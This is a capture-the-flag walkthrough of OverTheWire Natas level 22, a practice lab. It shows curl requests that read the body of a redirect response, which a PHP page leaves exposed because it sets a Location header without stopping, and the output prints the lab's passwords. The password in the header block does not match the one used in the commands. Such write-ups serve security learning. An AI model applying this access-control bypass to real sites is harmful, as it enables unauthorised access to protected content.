# Natas Level 22
```bash
Username: natas22
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
URL:      http://natas22.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas22.png" />
    <div align="center">Natas 22</div>
</figure>

*nothing at all :confused:*

And the [source code](http://natas22.natas.labs.overthewire.org/index-source.html):
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas22-view-sourcecode.png" />
    <div align="center">Natas 22 - View sourcecode</div>
</figure>

We can see two scripts (the first is at top):
```php
session_start(); 

if(array_key_exists("revelio", $_GET)) { 
    // only admins can reveal the password 
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
        header("Location: /"); 
    } 
}
```

And:
```php
if(array_key_exists("revelio", $_GET)) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas23\n"; 
    print "Password: <censored></pre>"; 
}
```

When sending the GET parameter "revelio", the first script check if we are admins (admin=1 in session data), and if not - redirects us out of the page, damn!

Lets first mimic browser behavior using cURL:

```bash
curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ -vv -L 'http://natas22.natas.labs.overthewire.org/index.php?revelio'
```

The output is:
```bash
* Trying 176.9.9.172...
* Connected to natas22.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas22'
> GET /index.php?revelio HTTP/1.1
> Host: natas22.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Sun, 27 May 2018 08:29:26 GMT
< Server: Apache/2.4.10 (Debian)
< Set-Cookie: PHPSESSID=hulsqnjmqsthvkejjmgkdutv35; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Location: /
< Content-Length: 1049
< Content-Type: text/html; charset=UTF-8
< 
* Ignoring the response-body
* Connection #0 to host natas22.natas.labs.overthewire.org left intact
* Issue another request to this URL: 'http://natas22.natas.labs.overthewire.org/'
* Found bundle for host natas22.natas.labs.overthewire.org: 0x4b26cede50 [can pipeline]
* Re-using existing connection! (#0) with host natas22.natas.labs.overthewire.org
* Connected to natas22.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas22'
> GET / HTTP/1.1
> Host: natas22.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sun, 27 May 2018 08:29:26 GMT
< Server: Apache/2.4.10 (Debian)
< Set-Cookie: PHPSESSID=5ag55dh7kj067p2t9f08hd1116; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 917
< Content-Type: text/html; charset=UTF-8
<


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas22.natas.labs.overthewire.org left intact
```

We can see the redirection.

now lets NOT TO FOLLOW recirects.

It can be done easy with cURL (dont send the *-L* switch):
```bash
curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ -v 'http://natas22.natas.labs.overthewire.org/index.php?revelio'
```

The output:
```bash
* Trying 176.9.9.172...
* Connected to natas22.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas22'
> GET /index.php?revelio HTTP/1.1
> Host: natas22.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMyMjpjaEc5ZmJlMVRxMmVXVk1nallZRDFNc2ZJdk40NjFrSg==
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Sun, 27 May 2018 08:31:05 GMT
< Server: Apache/2.4.10 (Debian)
< Set-Cookie: PHPSESSID=ifgi20ecnrhe8k5k9dream91v6; path=/; HttpOnly
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Location: /
< Content-Length: 1049
< Content-Type: text/html; charset=UTF-8
<


<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas22.natas.labs.overthewire.org left intact
```

We got the password for the next level: **D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE**